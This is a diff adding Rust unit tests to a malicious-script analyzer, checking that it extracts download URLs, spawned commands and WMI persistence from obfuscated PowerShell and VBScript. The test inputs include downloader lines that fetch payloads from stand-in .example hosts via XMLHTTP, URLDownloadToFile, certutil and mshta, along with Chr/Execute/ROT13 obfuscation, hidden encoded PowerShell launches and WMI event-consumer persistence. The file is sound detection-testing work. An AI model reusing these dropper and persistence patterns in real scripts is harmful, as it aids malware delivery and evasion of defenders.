+            )
+        });
+        assert!(
+            has,
+            "no Download after double-quoted -join: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps_array_subexpression_variable_join_resolves() {
         let inner = r#"$p=@('https://','ps-array-var.example','/stage');$u=$p -join '';Invoke-WebRequest $u"#;
         let script = format!("powershell -Command \"{}\"\r\n", inner);
@@ -8517,6 +19548,23 @@ mod ps_replace_join_tests {
         assert!(
             has,
             "no Download after @() array variable join: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps_double_quoted_array_variable_join_resolves() {
+        let inner = r#"$p=@("https://","ps-array-var-dq.example","/stage");$u=$p -join "";Invoke-WebRequest $u"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-array-var-dq.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "no Download after double-quoted @() array variable join: {:?}",
             report.traits
         );
     }
@@ -8562,6 +19610,71 @@ mod vbs_url_extraction_tests {
     }
 
     #[test]
+    fn vbs_xmlhttp_savetofile_concat_destination_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim http, stream, out
+out = "C:\Users\Public\" & "drop.exe"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "https://vbs.example/drop.bin", False
+http.Send
+Set stream = CreateObject("ADODB.Stream")
+stream.SaveToFile out, 2"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://vbs.example/drop.bin"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\drop.exe")
+            )
+        });
+        assert!(
+            has,
+            "no VBS Download destination from SaveToFile concat: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_const_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Const u = "https://vbs-const.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://vbs-const.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Const URL binding: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_colon_separated_binding() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"u = "https://vbs-colon.example/payload.txt" : Set http = CreateObject("MSXML2.XMLHTTP") : http.Open "GET", u, False : http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://vbs-colon.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS colon-separated URL binding: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_concat_variable() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
@@ -8579,6 +19692,49 @@ http.Send"#;
         assert!(
             has,
             "no Download trait from VBS concatenated variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_plus_concat_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = "ht" + "tp://vbs-plus-concat.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-plus-concat.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS plus-concatenated variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_inline_concat_argument() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim http
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "http://vbs-inline-" & "concat.example/payload.txt", False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-inline-concat.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS inline concatenated XMLHTTP URL: {:?}",
             env.traits
         );
     }
@@ -8606,6 +19762,50 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_spaced_chr_concat_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Chr (&H68) & "ttp://vbs-spaced-chr.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-spaced-chr.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS spaced Chr concatenated variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_chrb_concat_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = ChrB(104) & "ttp://vbs-chrb.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-chrb.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS ChrB concatenated variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_variable_concat_binding() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim proto, host, u, http
@@ -8625,6 +19825,28 @@ http.Send"#;
         assert!(
             has,
             "no Download trait from VBS variable concatenated URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_inline_commented_binding() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = "http://vbs-inline-comment.example/payload.txt" ' staging URL
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-inline-comment.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS inline-commented URL binding: {:?}",
             env.traits
         );
     }
@@ -8698,6 +19920,95 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_eval_wrapper() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Eval("""h"" & ""ttp://vbs-eval.example/payload.txt""")
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-eval.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Eval-wrapped URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_execute_assignment() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+Execute "u = ""http://vbs-execute.example/payload.txt"""
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-execute.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Execute assignment URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_execute_variable_assignment() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim script, u, http
+script = "u = ""http://vbs-execute-var.example/payload.txt"""
+Execute script
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-execute-var.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Execute variable assignment URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_nested_execute_assignment() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+Execute "Execute ""u = """"http://vbs-nested-execute.example/payload.txt"""""""
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-nested-execute.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from nested VBS Execute assignment URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_replace_wrapper() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
@@ -8715,6 +20026,28 @@ http.Send"#;
         assert!(
             has,
             "no Download trait from VBS Replace-wrapped URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_textcompare_replace_wrapper() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Replace("hXXp://vbs-textcompare-replace.example/payload.txt", "xx", "tt", 1, -1, vbTextCompare)
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-textcompare-replace.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS text-compare Replace URL: {:?}",
             env.traits
         );
     }
@@ -8742,6 +20075,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_mid_hex_index_wrapper() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Mid("XXhttp://vbs-mid-hex.example/payload.txt", &H3)
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-mid-hex.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Mid hex-index URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_hex_chr_concat_variable() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
@@ -8759,6 +20114,28 @@ http.Send"#;
         assert!(
             has,
             "no Download trait from VBS hex Chr concatenated URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_xmlhttp_url_extracted_from_arithmetic_chr_concat_variable() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Chr(100 + 4) & Chr(&H70 + 4) & "tp://vbs-arith-chr.example/payload.txt"
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-arith-chr.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS arithmetic Chr concatenated URL: {:?}",
             env.traits
         );
     }
@@ -8831,6 +20208,28 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_join_split_wrapper() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u, http
+u = Join(Split("h t t p : / / v b s - j o i n - s p l i t . e x a m p l e / p a y l o a d . t x t", " "), "")
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", u, False
+http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-join-split.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Join(Split(...)) URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_xmlhttp_url_extracted_from_split_index_wrapper() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u, http
@@ -8862,12 +20261,77 @@ URLDownloadToFile 0, u, "payload.exe", 0, 0"#;
         crate::vbs_scan::scan_vbs_payloads(&mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
-                Trait::Download { src, .. } if src == "http://vbs-urldown-var.example/payload.exe"
+                Trait::Download { src, dst, .. }
+                    if src == "http://vbs-urldown-var.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
             )
         });
         assert!(
             has,
-            "no Download trait from VBS URLDownloadToFile variable URL: {:?}",
+            "no Download trait with destination from VBS URLDownloadToFile variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_urldownloadtofile_ansi_suffix_destination_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u
+u = "http://vbs-urldown-ansi.example/payload.exe"
+URLDownloadToFileA 0, u, "ansi.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://vbs-urldown-ansi.example/payload.exe"
+                        && dst.as_deref() == Some("ansi.exe")
+            )
+        });
+        assert!(
+            has,
+            "no Download trait with destination from VBS URLDownloadToFileA: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_urldownloadtofile_schemeless_domain_path_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Dim u
+u = "vbs-urldown-schemeless.com/payload.exe"
+URLDownloadToFileW 0, u, "wide.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://vbs-urldown-schemeless.com/payload.exe"
+                        && dst.as_deref() == Some("wide.exe")
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from schemeless VBS URLDownloadToFileW: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_urldownloadtofile_url_extracted_from_inline_concat_argument() {
+        let mut env = Environment::new(&Config::default());
+        let vbs =
+            br#"URLDownloadToFile 0, "http://" & "vbs-urldown-concat.example/payload.exe", "payload.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-urldown-concat.example/payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS URLDownloadToFile inline concat URL: {:?}",
             env.traits
         );
     }
@@ -8887,6 +20351,211 @@ sh.Run "mshta http://vbs-run.example/payload.hta", 0, False"#;
         assert!(
             has,
             "no Download trait from VBS WScript.Shell.Run URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_wscript_shell_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta vbs-run-schemeless.example/payload.hta", 0, False"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://vbs-run-schemeless.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS WScript.Shell.Run schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_wscript_shell_exec_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Exec "mshta vbs-exec.example/payload.hta""#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-exec.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS WScript.Shell.Exec schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_wscript_shell_parenthesized_exec_powershell_extracted() {
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+Set proc = sh.Exec("powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQBlAHgAZQBjAA==")"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("Write-Host from-exec")),
+            "parenthesized VBS WScript.Shell.Exec PowerShell was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn vbs_callbyname_shell_run_powershell_extracted() {
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+methodName = "R" & "un"
+cmd = "power" & "shell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQBjAGEAbABsAGIAeQBuAGEAbQBlAA=="
+CallByName sh, methodName, vbMethod, cmd"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("Write-Host from-callbyname")),
+            "CallByName VBS WScript.Shell.Run PowerShell was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn vbs_getref_zero_arg_function_shell_run_powershell_extracted() {
+        let vbs = br#"Function JoinCmd()
+  JoinCmd = "power" & "shell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQBmAHUAbgBjAA=="
+End Function
+
+Set sh = CreateObject("WScript.Shell")
+Set thunk = GetRef("JoinCmd")
+sh.Run thunk(), 0, False"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("Write-Host from-func")),
+            "GetRef zero-arg VBS function shell command was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn vbs_direct_zero_arg_function_shell_run_powershell_extracted() {
+        let vbs = br#"Function JoinCmd()
+  JoinCmd = "power" & "shell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQBmAHUAbgBjAA=="
+End Function
+
+Set sh = CreateObject("WScript.Shell")
+sh.Run JoinCmd(), 0, False"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("Write-Host from-func")),
+            "direct zero-arg VBS function shell command was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn vbs_single_arg_wrapper_shell_run_powershell_extracted() {
+        let vbs = br#"Function Launch(ByVal cmd)
+  Set sh = CreateObject("WScript.Shell")
+  sh.Run cmd, 0, False
+End Function
+
+Launch "power" & "shell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGYAcgBvAG0ALQB3AHIAYQBwAHAAZQByAA==""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("Write-Host from-wrapper")),
+            "single-arg VBS wrapper shell command was not extracted: {:?}",
+            report.extracted_ps1_normalized
+        );
+    }
+
+    #[test]
+    fn vbs_multi_arg_wrapper_local_shell_command_download_extracted() {
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+
+Function Fetch(ByVal url, ByRef dst)
+  Dim cmd
+  cmd = "cmd.exe /c certutil -urlcache -split -f """ & url & """ """ & dst & """"
+  sh.Run cmd, 0, True
+End Function
+
+If Not Fetch("https://wrapper.example/payload.dat", "C:\Users\Public\payload.dat") Then WScript.Quit 0"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "https://wrapper.example/payload.dat"
+                )
+            }),
+            "multi-arg VBS wrapper shell command download was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn vbs_shell_application_shellexecute_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("Shell.Application")
+sh.ShellExecute "mshta", "vbs-shellexecute.example/payload.hta", "", "open", 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://vbs-shellexecute.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS Shell.Application.ShellExecute schemeless URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn vbs_wscript_shell_run_inline_concat_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta " & "http://vbs-run-concat.example/payload.hta", 0, False"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://vbs-run-concat.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS WScript.Shell.Run inline concat URL: {:?}",
             env.traits
         );
     }
@@ -8913,6 +20582,1435 @@ sh.Run cmd, 0, False"#;
     }
 
     #[test]
+    fn standalone_vbs_wmi_process_create_extracts_inner_command() {
+        let vbs = br#"Dim objWMI
+Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+Dim objProcess
+Set objProcess = objWMI.Get("Win32_Process")
+Dim cmd
+cmd = "cmd.exe /c whoami"
+objProcess.Create cmd, Null, Null, iPID"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WmicProcessCreate { inner_cmd }
+                        if inner_cmd == "cmd.exe /c whoami"
+                )
+            }),
+            "no WmicProcessCreate from VBS Win32_Process.Create: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Win32_Process"),
+            "standalone VBS source was not preserved: {}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_wmi_process_create_rot13_powershell_is_decoded() {
+        let vbs = br#"On Error Resume Next
+names = Array("VAGREANY_QO_PNPUR", "cbjrefuryy.rkr -RkrphgvbaCbyvpl Olcnff -AbCebsvyr -JvaqbjFglyr Uvqqra -Pbzznaq")
+cmd = names(1) & " ""& ([ScWDripWDtBWDloWDck]::CWDrWDeate(${env:" & names(0) & "}))"""
+cmd = Replace(cmd, "WD", "")
+Set svc = GetObject("winmgmts:root\cimv2")
+svc.Get("Win32_Process").Create cmd, Null, Nothing, pid"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WmicProcessCreate { inner_cmd }
+                        if inner_cmd == "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"& ([ScriptBlock]::Create(${env:INTERNAL_DB_CACHE}))\""
+                )
+            }),
+            "ROT13 WMI Process.Create command was not decoded: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .extracted_ps1
+                .iter()
+                .any(|ps| String::from_utf8_lossy(ps).contains("ScriptBlock")),
+            "decoded ROT13 PowerShell command was not extracted as PS: {:?}",
+            report.extracted_ps1
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_wmi_process_execmethod_inparams_extracts_inner_command() {
+        let vbs = br#"Set svc = GetObject("winmgmts:\\.\root\cimv2")
+Set objProcess = svc.Get("Win32_Process")
+Set objMethod = objProcess.Methods_("Create")
+Set objInParams = objMethod.InParameters
+Set inParams = objInParams.SpawnInstance_
+inParams.CommandLine = "cmd.exe /c powershell.exe -NoP -Command Write-Host inparams"
+objProcess.ExecMethod_ "Create", inParams"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WmicProcessCreate { inner_cmd }
+                        if inner_cmd == "cmd.exe /c powershell.exe -NoP -Command Write-Host inparams"
+                )
+            }),
+            "no WmicProcessCreate from VBS Win32_Process ExecMethod_ inparams: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_ps1.len(),
+            1,
+            "ExecMethod_ command should be recursively routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_wmi_commandline_consumer_emits_persistence_and_queues_ps() {
+        let vbs = br#"Set wmi = GetObject("winmgmts:\\.\root\subscription")
+Set consumer = wmi.Get("CommandLineEventConsumer").SpawnInstance_()
+consumer.Name = "CmdConsumer"
+consumer.CommandLineTemplate = "cmd.exe /c powershell.exe -NoP -Command Write-Host consumer"
+consumer.Put_()"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "WMIEventConsumer"
+                    && key == "CmdConsumer"
+                    && value_name == "CommandLineTemplate"
+                    && command == "cmd.exe /c powershell.exe -NoP -Command Write-Host consumer"
+            )),
+            "no WMI CommandLineEventConsumer Persistence trait: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_ps1.len(),
+            1,
+            "consumer command should be recursively routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_wmi_commandline_consumer_combines_executable_path() {
+        let vbs = br#"Set wmi = GetObject("winmgmts:\\.\root\subscription")
+Set consumer = wmi.Get("CommandLineEventConsumer").SpawnInstance_()
+consumer.Name = "ExePathConsumer"
+consumer.ExecutablePath = "powershell.exe"
+consumer.CommandLineTemplate = "-NoP -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGUAeABlAHAAYQB0AGgA"
+consumer.Put_()"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    command,
+                    ..
+                } if hive == "WMIEventConsumer"
+                    && key == "ExePathConsumer"
+                    && command == "powershell.exe -NoP -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGUAeABlAHAAYQB0AGgA"
+            )),
+            "split executable/template WMI consumer not surfaced: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_ps1.len(),
+            1,
+            "consumer executable/template should be routed through powershell"
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_wmi_activescript_consumer_emits_persistence_and_queues_script() {
+        let vbs = br#"Set wmi = GetObject("winmgmts:\\.\root\subscription")
+Set consumer = wmi.Get("ActiveScriptEventConsumer").SpawnInstance_()
+consumer.Name = "ScriptConsumer"
+consumer.ScriptingEngine = "VBScript"
+consumer.ScriptText = "CreateObject(""WScript.Shell"").Run ""powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAHMAYwByAGkAcAB0AGMAbwBuAHMAdQBtAGUAcgA="", 0, False"
+consumer.Put_()"#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "WMIEventConsumer"
+                    && key == "ScriptConsumer"
+                    && value_name == "ScriptText"
+                    && command.contains("WScript.Shell")
+            )),
+            "no ActiveScriptEventConsumer Persistence trait: {:?}",
+            report.traits
+        );
+        assert_eq!(
+            report.extracted_ps1.len(),
+            1,
+            "ActiveScriptEventConsumer script should be scanned for powershell"
+        );
